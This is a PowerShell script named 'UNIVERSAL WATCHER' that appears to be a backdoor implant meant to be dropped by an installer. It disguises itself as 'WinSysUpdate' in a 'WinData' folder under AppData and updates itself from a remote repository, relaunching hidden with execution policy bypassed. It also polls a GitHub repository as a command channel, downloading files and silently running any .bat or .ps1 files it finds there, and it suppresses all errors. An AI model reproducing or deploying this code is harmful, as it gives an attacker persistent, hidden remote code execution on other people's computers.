# --- UNIVERSAL WATCHER ---
$githubRepo = "[[URL]]" # This will be filled automatically by installer
$targetDir = "$env:APPDATA\WinData"
$myPath = $PSCommandPath

while($true) {
    try {
        # Self-Update
        $remoteContent = Invoke-WebRequest -Uri "$githubRepo/WinSysUpdate.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
        if ($remoteContent -and $remoteContent -ne (Get-Content $myPath -Raw)) {
            Set-Content -Path $myPath -Value $remoteContent
            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
            exit
        }
        # Check for commands
        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/[[USER]]/[[REPO]]/contents/"
        foreach ($file in $files) {
            $n = $file.name
            $u = $file.download_url
            if ($n -like "create_*") {
                $c = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                Set-Content -Path (Join-Path $targetDir ($n -replace "create_","")) -Value $c
            }
            if ($n -like "run_*") {
                $p = Join-Path $targetDir $n
                Invoke-WebRequest -Uri $u -OutFile $p
                if ($n -like "*.bat") { Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden }
                elseif ($n -like "*.ps1") { Start-Process powershell -ArgumentList "-File `"$p`"" -WindowStyle Hidden }
            }
        }
    } catch { }
    Start-Sleep -Seconds 30
}
